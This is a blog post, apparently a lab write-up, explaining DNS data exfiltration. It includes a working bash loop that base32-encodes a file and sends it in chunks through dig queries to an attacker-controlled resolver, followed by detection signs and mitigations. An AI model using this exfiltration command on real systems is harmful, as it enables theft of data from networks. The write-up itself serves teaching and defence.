---
layout: post
title: "Data Exfiltration by Abusing DNS"
date: 2026-07-13 22:20:00 +0200
description: "A short showcase of how DNS can be abused as a data exfiltration channel."
categories: [security]
tags: [security, dns]
---

# Data Exfiltration by Abusing DNS

### This was BreachLab's [Phantom The Heist](https://breachlab.org/)

DNS is easy to overlook during a compromise. It is usually allowed out of a network, it is noisy by nature, and many environments focus harder on HTTP, SSH, or obvious file transfer tools. That makes it a useful channel for moving small amounts of data when a host can resolve external names.

In this lab example, the target file was:

```text
/opt/vault/classified.db
```

The exfiltration command was:

```bash
i=0
base32 -w0 /opt/vault/classified.db | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | while read -r chunk; do
    dig @10.13.37.30 "${chunk}.${i}.123.exfil.local" A
    i=$((i+1))
done
```

## How It Worked

The important trick is that DNS names can carry attacker-controlled text. Instead of sending the file directly over HTTP or copying it with `scp`, the file is encoded and placed into DNS query labels.

This part reads the file and converts it to DNS-safe text:

```bash
base32 -w0 /opt/vault/classified.db
```

Raw database bytes cannot be safely placed into a domain name. Base32 converts the file into letters and numbers. The `-w0` option keeps the output on one line, which makes it easier to split into fixed-size chunks afterwards.

Then the output is cleaned up:

```bash
tr -d '=' | tr 'A-Z' 'a-z'
```

Base32 padding uses `=` characters, but `=` is not valid inside a normal DNS label. Removing the padding makes the encoded text fit better into domain labels. Lowercasing the output is not strictly required, but it keeps the generated queries consistent.

Next, the encoded stream is split into small labels:

```bash
fold -w32
```

DNS has size limits. A single label can be up to 63 characters, and the full domain name can be up to 253 characters. Using 32-character chunks keeps each query comfortably inside those limits.

Finally, each chunk is placed into a DNS lookup:

```bash
dig @10.13.37.30 "${chunk}.${i}.123.exfil.local" A
```

Each query asks the DNS server at `10.13.37.30` for an `A` record. The requested hostname contains:

```text
<encoded-data>.<sequence-number>.123.exfil.local
```

The sequence number matters because DNS queries can arrive out of order or be retried. On the receiving side, the DNS server logs the queried names. The data can then be reconstructed by sorting the chunks by their sequence number, joining the Base32 text, restoring padding if needed, and decoding it back into the original file.

The DNS response itself is not important here. The useful part is the question being asked.

## Why DNS Is Useful for Abuse

DNS is a good abuse channel because it often has a path out of restricted networks. Even when direct internet access is blocked, systems still need name resolution to reach package mirrors, update servers, internal services, SaaS applications, and authentication providers.

It also blends into normal traffic better than many obvious exfiltration methods. A host making DNS queries is expected behavior. Security tools may alert on suspicious domains or high query volume, but quiet, low-rate DNS traffic can be easier to miss than a new outbound TCP connection to an unfamiliar service.

Another advantage is that DNS works through delegation. If an attacker controls a domain such as:

```text
exfil.example
```

they can configure authoritative nameservers for it. Any lookup for a random subdomain under that zone, such as:

```text
datachunk.42.exfil.example
```

eventually reaches infrastructure they control. That means the data can be captured just by observing DNS requests for the delegated zone.

DNS is not good for large files. It is slow, size-limited, and noisy when too much data is moved. But for small secrets, tokens, keys, hostnames, command output, or database snippets, it can be enough.

## What to Look For

Defenders can detect this technique by looking for DNS behavior that does not resemble normal browsing or service discovery:

- Long or high-entropy subdomains
- Many unique subdomains under the same parent domain
- Sequential labels such as `0`, `1`, `2`, `3`
- Repeated queries to unusual internal or external resolvers
- DNS requests containing encoded-looking text
- Large spikes in `NXDOMAIN` responses

The example query structure is especially suspicious:

```text
<base32 chunk>.<counter>.<identifier>.exfil.local
```

A normal application usually does not generate hundreds of unique, random-looking hostnames with numeric counters.

## Mitigations

The strongest control is to force clients to use approved recursive resolvers and block direct DNS to arbitrary servers. In this example, the command explicitly queries:

```text
10.13.37.30
```

If hosts are only allowed to talk to trusted DNS resolvers, direct exfiltration to an attacker-controlled resolver becomes harder.

Useful mitigations include:

- Block outbound DNS except from approved resolvers
- Log DNS queries centrally
- Alert on long, random, or high-volume subdomains
- Monitor for newly seen domains and unusual TLDs
- Limit which systems can resolve external names
- Inspect DNS-over-HTTPS and DNS-over-TLS policy gaps

DNS is necessary, so it cannot simply be turned off. The goal is to make DNS boring and predictable: known clients, known resolvers, logged queries, and alerts when hosts start using it like a transport protocol.
